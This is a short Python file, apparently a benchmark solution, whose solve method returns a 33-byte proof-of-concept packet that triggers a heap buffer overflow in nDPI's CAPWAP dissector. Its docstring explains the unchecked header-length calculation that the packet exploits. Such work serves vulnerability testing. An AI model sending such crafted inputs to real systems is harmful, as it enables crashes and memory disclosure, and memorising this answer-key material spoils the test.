import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in ndpi_search_setup_capwap.
        
        The vulnerability exists because the function calculates a header length from the 
        first byte of the packet without verifying that the packet is long enough to contain 
        that header. The length calculation is roughly:
        hlen = ((payload[0] >> 3) & 0x1F) * 4
        
        By setting payload[0] to 0xF8 (1111 1000), we get:
        (0xF8 >> 3) & 0x1F = 31
        31 * 4 = 124 bytes.
        
        If we provide a packet smaller than 124 bytes (e.g., the ground-truth 33 bytes), 
        the vulnerable code will attempt to read past the end of the packet buffer 
        when accessing data at the calculated offset.
        
        The fixed version includes a check ensuring payload_packet_len >= hlen, so it will 
        safely return without crashing.
        """
        # Ground truth length is 33 bytes.
        # First byte 0xF8 maximizes the calculated CAPWAP header length (124 bytes).
        # Remaining bytes can be padding (0x00).
        return b'\xf8' + b'\x00' * 32
